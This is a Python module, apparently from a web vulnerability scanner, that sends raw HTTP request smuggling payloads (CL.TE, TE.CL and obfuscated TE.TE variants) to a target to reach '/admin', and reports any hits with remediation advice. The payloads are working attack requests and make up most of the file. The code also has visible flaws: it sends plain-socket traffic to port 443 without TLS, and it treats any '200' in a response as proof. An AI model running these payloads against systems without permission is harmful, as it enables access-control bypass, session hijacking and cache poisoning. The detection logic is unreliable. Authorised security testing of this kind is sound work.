#!/usr/bin/env python3
"""
HTTP Request Smuggling Module
Based on James Kettle (PortSwigger) research
"""

import sys
import json
import socket
import time
from urllib.parse import urlparse

class HTTPSmugglingTester:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
        
    def test_cl_te(self, host, port):
        """Test CL.TE smuggling"""
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"\r\n"
        )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.sendall(payload.encode())
            
            response = sock.recv(4096)
            sock.close()
            
            if b"admin" in response.lower() or b"200" in response:
                return True, "CL.TE", response.decode('utf-8', errors='ignore')[:500]
        except Exception as e:
            return False, None, str(e)
        return False, None, None
    
    def test_te_cl(self, host, port):
        """Test TE.CL smuggling"""
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.sendall(payload.encode())
            
            response = sock.recv(4096)
            sock.close()
            
            if b"admin" in response.lower():
                return True, "TE.CL", response.decode('utf-8', errors='ignore')[:500]
        except Exception as e:
            return False, None, str(e)
        return False, None, None
    
    def test_te_te(self, host, port):
        """Test TE.TE smuggling with obfuscation"""
        payloads = [
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Transfer-encoding: x\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"GET /admin HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"\r\n"
            ),
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Transfer-Encoding:\r\n chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"GET /admin HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"\r\n"
            )
        ]
        
        for payload in payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((host, port))
                sock.sendall(payload.encode())
                
                response = sock.recv(4096)
                sock.close()
                
                if b"admin" in response.lower():
                    return True, "TE.TE", response.decode('utf-8', errors='ignore')[:500]
            except Exception as e:
                continue
        return False, None, None
    
    def scan(self):
        """Main scanning function"""
        parsed = urlparse(self.target)
        host = parsed.netloc.split(':')[0]
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        tests = [
            ("CL.TE", self.test_cl_te),
            ("TE.CL", self.test_te_cl),
            ("TE.TE", self.test_te_te),
        ]
        
        for test_name, test_func in tests:
            time.sleep(0.5)  # Avoid rate limiting
            is_vuln, technique, evidence = test_func(host, port)
            
            if is_vuln:
                self.vulnerabilities.append({
                    "type": "HTTP Request Smuggling",
                    "technique": technique,
                    "severity": "critical",
                    "title": f"HTTP Request Smuggling ({technique}) Detected",
                    "description": f"The target is vulnerable to HTTP Request Smuggling using {technique} technique. This allows attackers to bypass security controls, hijack sessions, and poison web caches.",
                    "payload": test_name,
                    "evidence": evidence,
                    "remediation": "1. Ensure all servers in the chain use the same method to determine request boundaries. 2. Use HTTP/2 where possible. 3. Configure front-end servers to normalize ambiguous requests. 4. Disable connection reuse on back-end connections.",
                    "cvss": "9.8"
                })
        
        return {
            "success": True,
            "vulnerabilities": self.vulnerabilities,
            "total_tests": len(tests),
            "vulnerabilities_found": len(self.vulnerabilities)
        }

def main():
    if len(sys.argv) < 2:
        print(json.dumps({"success": False, "error": "Target URL required"}))
        sys.exit(1)
    
    target = sys.argv[1]
    tester = HTTPSmugglingTester(target)
    result = tester.scan()
    
    print(json.dumps(result))

if __name__ == "__main__":
    main()
